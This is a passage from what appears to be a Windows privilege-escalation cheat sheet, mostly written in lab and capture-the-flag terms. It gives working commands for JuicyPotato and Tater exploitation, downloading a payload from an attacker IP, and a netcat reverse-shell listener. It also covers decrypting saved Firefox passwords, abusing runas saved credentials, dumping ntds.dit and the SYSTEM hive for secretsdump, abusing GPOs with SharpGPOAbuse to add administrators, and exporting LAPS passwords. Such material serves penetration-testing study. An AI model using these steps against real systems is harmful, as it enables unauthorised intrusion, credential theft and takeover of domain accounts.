</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadfile<span class="o">(</span><span class="s1">'http://10.10.14.31/file'</span>, <span class="s1">'C:\temp\file'</span><span class="o">)</span>
</pre></table></code></div></div><li>Set a listener on port 9999<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>rlwrap nc <span class="nt">-lnvp</span> 9999
</pre></table></code></div></div></ol><h3 id="windows-vm-12"><span class="mr-2">Windows VM</span><a href="#windows-vm-12" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Run juicy potato<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>./jp.exe <span class="nt">-p</span> shell.bat <span class="nt">-l</span> 7777 <span class="nt">-t</span> <span class="k">*</span>
</pre></table></code></div></div><ul><li>If this fail<li>Try with a different CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\SYSTEM<li>Link –&gt; <a href="http://ohpe.it/juicy-potato/CLSID">http://ohpe.it/juicy-potato/CLSID</a></ul><li>Lets run again<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>./jp.exe <span class="nt">-p</span> shell.bat <span class="nt">-l</span> 7777 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-c</span> <span class="s2">"{e60687f7-01a1-40aa-86ac-db1cbf673334}"</span>
</pre></table></code></div></div></ol><h3 id="kali-vm-17"><span class="mr-2">Kali VM</span><a href="#kali-vm-17" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="hot-potato-attack"><span style="color:lightblue">Hot Potato attack</span></h1><h2 id="methodology-9"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Hot Potato takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP-&gt;SMB relay) and NBNS spoofing.</p><h2 id="detection-9"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="windows-vm-13"><span class="mr-2">Windows VM</span><a href="#windows-vm-13" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>We should have <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privileges enabled<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span><span class="nb">whoami</span> /priv
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161144004-97322646-a231-4fef-afd8-239570f44f8c.png" alt="image" data-proofer-ignore></p></ol><h2 id="exploitation-9"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I will be demonstrating a simple exploitation technique by adding a user to the local administrators group using <a href="https://github.com/Kevin-Robertson/Tater/blob/master/Tater.ps1">Tater.ps1</a></p><h3 id="windows-vm-14"><span class="mr-2">Windows VM</span><a href="#windows-vm-14" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Enter the following to gain administrator access<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>powershell.exe <span class="nt">-nop</span> <span class="nt">-ep</span> bypass
<span class="gp">PS C:\Temp&gt;</span><span class="w"> </span>Import-Module C:<span class="se">\T</span>emp<span class="se">\T</span>ater.ps1
<span class="gp">PS C:\Temp&gt;</span><span class="w"> </span>Invoke-Tater <span class="nt">-Trigger</span> 1 <span class="nt">-Command</span> <span class="s2">"net localgroup administrators user /add"</span>
</pre></table></code></div></div></ol><h1 id="kernel-exploits"><span style="color:lightblue">Kernel Exploits</span></h1><h2 id="searcing-exploits"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Searcing exploits</span></span><a href="#searcing-exploits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This method is handy for checking any existing exploits available for the machine by looking at the system information. From the results of <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py">windows-exploit-suggester.py</a> we can select one of the kernel exploits and try to escalate privileges.</p><h3 id="windows-vm-15"><span class="mr-2">Windows VM</span><a href="#windows-vm-15" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Run systeminfo and save it into a text file</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>systeminfo
</pre></table></code></div></div><h3 id="kali-vm-18"><span class="mr-2">Kali VM</span><a href="#kali-vm-18" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Pass the file thorugh <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py">windows-exploit-suggester.py</a></ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>./windows-exploit-suggester.py <span class="nt">--update</span>
<span class="go">
[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2020-06-06-mssb.xlsx
[*] done

</span><span class="gp">$</span><span class="w"> </span>./windows-exploit-suggester.py <span class="nt">--database</span> 2020-06-06-mssb.xlsx <span class="nt">--systeminfo</span> systeminfo.txt 
<span class="go">
Exploits will be displayed here...
</span></pre></table></code></div></div><h1 id="password-mining-escalation---firefox"><span style="color:lightblue">Password Mining Escalation - Firefox</span></h1><h2 id="detection-10"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>winpeas<li>Path location :<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\u</span>sernamehere<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>ozilla<span class="se">\F</span>irefox<span class="se">\P</span>rofiles
</pre></table></code></div></div></ol><h2 id="requirements"><span class="mr-2">Requirements</span><a href="#requirements" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Copy the following files from the Windows VM to Kali VM:</p><ol><li>key4.db<li>logins.json<li>addons.json<li>cert9.db</ol><h2 id="exploitation-10"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Download the following<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>git clone https://github.com/lclevy/firepwd.git
</pre></table></code></div></div><li>Place the required files in the same directory and run the python file for the creds</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 firepwd.py
<span class="go"> 
globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
</span><span class="gp">&lt;SNIP&gt;</span><span class="w">
</span><span class="go">clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
</span><span class="gp">   https://creds.com:b'mayor',b'&lt;&lt;HIDDEN&gt;</span><span class="o">&gt;</span><span class="s1">'
</span></pre></table></code></div></div><h1 id="runas-savdcreds"><span style="color:lightblue">Runas-Savdcreds</span></h1><h2 id="methodology-10"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can check if there are any pre-existing credentials of the administrator on the system. We can abuse this by using the loaded creds for privilege escalation. In the below example, I will demonstrate how to read files through the saved creds.</p><h2 id="detection-11"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>winpeas<li>Checking for existence</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>cmdkey /list
<span class="go">Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
</span></pre></table></code></div></div><h2 id="exploitation-11"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Reading root flag</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\r</span>unas.exe /user:ACCESS<span class="se">\A</span>dministrator /savecred <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe /c TYPE c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt &gt; C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\s</span><span class="s2">ecurity</span><span class="se">\r</span><span class="s2">oot1.txt"</span>
</pre></table></code></div></div><h1 id="backup-operators-disk-shadow--robocopy"><span style="color:lightblue">Backup Operators (Disk shadow + Robocopy)</span></h1><h2 id="methodology-11"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-11" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>If the user is a part of the Backup Operator group, the user has the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file.</p><h2 id="detection-12"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-12" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The user should be a part of the Backup Operators group and should have SeBackupPrivilege and SeRestorePrivilege Enabled</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>net user unsername-here
<span class="gp">C:\Temp&gt;</span><span class="w"> </span><span class="nb">whoami</span> /all
</pre></table></code></div></div><h2 id="exploitation-12"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-12" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-19"><span class="mr-2">Kali VM</span><a href="#kali-vm-19" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Create this script and transfer it to Windows VM</ol><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">set</span><span class="w"> </span><span class="nx">verbose</span><span class="w"> </span><span class="nx">onX</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">metadata</span><span class="w"> </span><span class="nx">C:\Windows\Temp\meta.cabX</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">clientaccessibleX</span><span class="w">
</span><span class="n">set</span><span class="w"> </span><span class="nx">context</span><span class="w"> </span><span class="nx">persistentX</span><span class="w">
</span><span class="kr">begin</span><span class="w"> </span><span class="n">backupX</span><span class="w">
</span><span class="nx">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">C:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">cdriveX</span><span class="w">
</span><span class="n">createX</span><span class="w">
</span><span class="nx">expose</span><span class="w"> </span><span class="o">%</span><span class="nx">cdrive</span><span class="o">%</span><span class="w"> </span><span class="nx">E:X</span><span class="w">
</span><span class="kr">end</span><span class="w"> </span><span class="n">backupX</span><span class="w">
</span></pre></table></code></div></div><h3 id="windows-vm-16"><span class="mr-2">Windows VM</span><a href="#windows-vm-16" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Pass the script to <strong>diskshadow unility</strong> to create the shadow copy<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">diskshadow</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">script.txt</span><span class="w">
</span></pre></table></code></div></div><li>Now copy the NTDS file using <strong><em>Robocopy</em></strong> to the Temp file we created in the C: drive<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">robocopy</span><span class="w"> </span><span class="nx">/b</span><span class="w"> </span><span class="nx">E:\Windows\ntds</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">ntds.dit</span><span class="w">
</span></pre></table></code></div></div><li>Next we get the system registry hive that contains the key needed to decrypt the NTDS file with <strong><em>reg save</em></strong> command.<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\system</span><span class="w"> </span><span class="nx">c:\temp\system.hive</span><span class="w">
</span></pre></table></code></div></div></ol><h3 id="dumping-ntml-hashes"><span class="mr-2">Dumping NTML Hashes</span><a href="#dumping-ntml-hashes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>We can use <code class="language-plaintext highlighter-rouge">secretsdump.py</code> do decrypt the DA creds on Kali VM</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system.hive LOCAL | <span class="nb">tee </span>hash-dump
</pre></table></code></div></div><h1 id="abusing-gpo-permissions"><span style="color:lightblue">Abusing GPO permissions</span></h1><h2 id="exploitation-13"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-13" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We Abusing GPO by adding the user to the local Administrators group leveraging a tool called SharpGPOAbuse.</p><p>Source : <a href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a></p><p>Pre compiled binaries : <a href="https://github.com/Flangvik/SharpCollection">https://github.com/Flangvik/SharpCollection</a></p><ul><li>Add user to local administrator groups</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Enterprise-Share</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpGPOAbuse.exe</span><span class="w"> </span><span class="nt">--AddComputerTask</span><span class="w"> </span><span class="nt">--TaskName</span><span class="w"> </span><span class="s2">"Debug"</span><span class="w"> </span><span class="nt">--Author</span><span class="w"> </span><span class="nx">vulnnet\administrator</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="s2">"cmd.exe"</span><span class="w"> </span><span class="nt">--Arguments</span><span class="w"> </span><span class="s2">"/c net localgroup administrators enterprise-security /add"</span><span class="w"> </span><span class="nt">--GPOName</span><span class="w"> </span><span class="s2">"SECURITY-POL-VN"</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vulnnet.local</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VULNNET-BC3TCK1SHNQ.vulnnet.local</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">Distinguished</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CN</span><span class="o">=</span><span class="n">Policies</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">System</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">vulnnet</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">local</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">GUID</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="s2">"SECURITY-POL-VN"</span><span class="w"> </span><span class="nx">is:</span><span class="w"> </span><span class="p">{</span><span class="mi">31</span><span class="n">B2F340-016D-11D2-945F-00C04FB984F9</span><span class="p">}</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Creating</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">\\vulnnet.local\SysVol\vulnnet.local\Policies\</span><span class="p">{</span><span class="mi">31</span><span class="n">B2F340-016D-11D2-945F-00C04FB984F9</span><span class="p">}</span><span class="n">\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nx">versionNumber</span><span class="w"> </span><span class="nx">attribute</span><span class="w"> </span><span class="nx">changed</span><span class="w"> </span><span class="nx">successfully</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">number</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">GPT.ini</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">increased</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="nx">GPO</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">modified</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">include</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">immediate</span><span class="w"> </span><span class="nx">task.</span><span class="w"> </span><span class="nx">Wait</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">GPO</span><span class="w"> </span><span class="nx">refresh</span><span class="w"> </span><span class="nx">cycle.</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Done</span><span class="o">!</span><span class="w">
</span></pre></table></code></div></div><ul><li>Force Update the system</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Enterprise-Share</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">gpupdate</span><span class="w"> </span><span class="nx">/force</span><span class="w">
</span><span class="n">Updating</span><span class="w"> </span><span class="nx">policy...</span><span class="w">
</span><span class="n">Computer</span><span class="w"> </span><span class="nx">Policy</span><span class="w"> </span><span class="nx">update</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Policy</span><span class="w"> </span><span class="nx">update</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><ul><li>Now review our group memberships after we forced the policies to be updated on the target machine.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Enterprise-Share</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">enterprise-security</span><span class="w">
</span><span class="c"># Will be added to the administrators group</span><span class="w">
</span></pre></table></code></div></div><h1 id="export-laps-passwords"><span style="color:lightblue">Export LAPS Passwords</span></h1><h2 id="methodology-12"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-12" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The following script assumes that LAPS has already been configured into your environment &amp; that your user account already has access to view LAPS passwords using the Fat Client UI or from Active Directory Users &amp; Computers.</p><p>This script loads the Active Directory module, finds the LAPS password fields, and then saves them to a CSV with the date appended to the file name. The only thing you’d need to change is the file path.</p><h2 id="exploitation-14"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-14" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Just Open Powershell and paste this script<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$Computers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">ms-Mcs-AdmPwd</span><span class="p">,</span><span class="w"> </span><span class="nx">ms-Mcs-AdmPwdExpirationTime</span><span class="w">
</span><span class="nv">$Computers</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Sort-Object</span><span class="w"> </span><span class="nx">ms-Mcs-AdmPwdExpirationTime</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">DnsHostName</span><span class="p">,</span><span class="w"> </span><span class="nx">ms-Mcs-AdmPwd</span><span class="p">,</span><span class="w"> </span><span class="nx">ms-Mcs-AdmPwdExpirationTime</span><span class="w">
</span><span class="nv">$computers</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">c:\temp\</span><span class="s2">"LAPS-</span><span class="si">$(</span><span class="p">(</span><span class="n">Get-Date</span><span class="p">)</span><span class="o">.</span><span class="nf">ToString</span><span class="p">(</span><span class="s2">"MM-dd-yyyy"</span><span class="p">)</span><span class="si">)</span><span class="s2">.csv"</span><span class="w"> </span><span class="nt">-NoTypeInformation</span><span class="w">
</span></pre></table></code></div></div><li>Then, save it to the location of your choice. For this example, I’m saving to<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">C:\Scripts\LAPSexport.ps1
